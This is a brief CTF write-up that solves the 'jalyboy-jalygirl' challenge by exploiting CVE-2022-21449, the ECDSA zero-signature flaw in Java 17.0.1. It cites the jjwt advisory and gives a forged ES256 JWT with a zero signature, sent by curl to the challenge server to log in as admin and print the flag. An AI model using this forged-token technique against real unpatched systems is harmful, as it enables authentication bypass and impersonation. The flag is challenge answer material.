# jalyboy-jalygirl

## Flag

LINECTF{abaa4d1cb9870fd25776a81bbd278932}

## Solver

Dockerfile:

```dockerfile
FROM openjdk:17.0.1-jdk-slim
```

- [CVE-2022-21449](https://www.cve.org/CVERecord?id=CVE-2022-21449)

- [jjwt/CHANGELOG.md at 0.11.3 · jwtk/jjwt](https://github.com/jwtk/jjwt/blob/0.11.3/CHANGELOG.md)

    > This patch release adds security guards against an ECDSA bug in Java SE versions 15-15.0.6, 17-17.0.2, and 18 (CVE-2022-21449). This patch allows JJWT users using those JVM versions to upgrade to JJWT 0.11.3, even if they are unable to upgrade their JVM to patched/fixed JVM version in a timely manner. Note: if your application does not use these JVM versions, you are not exposed to the JVM vulnerability.

- [JVM Vulnerabiliity CVE-2022-21449 · Issue #726 · jwtk/jjwt](https://github.com/jwtk/jjwt/issues/726#issuecomment-1106140655)

    > I can confirm that jjwt 0.11.2 is vulnerable.
    >
    > This JWT will pass all checks:
    >
    > eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJCb2IifQ.MAYCAQACAQA

```console
$ curl -s http://34.85.123.82:10001/?j=eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA | grep -o 'LINECTF{.*}'
LINECTF{abaa4d1cb9870fd25776a81bbd278932}
```
